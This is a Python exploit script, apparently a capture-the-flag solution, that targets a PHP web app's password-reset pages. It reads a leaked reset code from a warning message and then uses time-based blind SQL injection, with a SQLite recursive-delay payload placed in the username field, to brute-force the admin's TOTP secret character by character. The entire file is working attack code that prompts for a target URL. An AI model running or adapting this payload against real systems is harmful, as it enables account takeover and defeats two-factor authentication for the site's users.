import time
import requests


class DumperOTP(object):
    def __init__(self):
        self.url = input("paste CTF url here: ")
        self.headers = {
            "Content-Type": "application/x-www-form-urlencoded",
            # "Cookie": "PHPSESSID=atg9k8hfitkkk9me76qcigrqja"
        }

    def get_code(self):
        data: dict = {
            "form_name": "reset",
            "username": "admin",
            "is_tenant": "1"
        }
                
        req = requests.post(url=f"{self.url}/reset.php", data=data, headers=self.headers)
        code = req.text.split('Warning: Reset code ')[1].split()[0]

        return code
    
    def send_attack(self):
        # Character set and length to brute force
        MAX_LEN = 8
        characterset = "ABCDEFGHIJKLMNPQRSTUVWXYZ234567"
        totp_code = ''

        # SQLite payload standards
        delaynum = 5000000 # Adjust for shorter cracking time but smaller epsilon
        benchmark = 1

        for i in range(MAX_LEN):

            for char in characterset:
                print(f"[Trying: {char}]")
                totp_code += char 

                # Create playload with new resetcode
                reset_code = self.get_code()
                payload = f"admin' AND totp_secret LIKE '{totp_code}%' AND (SELECT count(*)FROM (WITH RECURSIVE delay(x) AS (SELECT 1 UNION ALL SELECT x + 1 FROM delay WHERE x < {delaynum}) SELECT * FROM delay)) > 0-- -"
                data = {
                    "form_name": "set_new_password",
                    "code": f"{reset_code}",
                    "username": f"{payload}",
                    "password": "admin",
                    "password_confirm": "admin"
                }

                # Try this combo in query
                start = time.time()
                req = requests.post(url = f"{self.url}/set_new_password.php", headers=self.headers, data=data)
                with open('test.html', 'wb') as f:
                    f.write(req.content)
                end = time.time()
                print(f"")
                # If takes longer, we know this character is correct b/c of LIKE matching delay
                if end-start > benchmark:
                    print(f"[ Current Code: {totp_code}]")
                    break
                else: # Remove this char for the next iteration
                    totp_code = totp_code[:-1]
        
        print("Brute Forced: "+totp_code)


if __name__ == "__main__":
    DumperObj = DumperOTP()
    DumperObj.send_attack()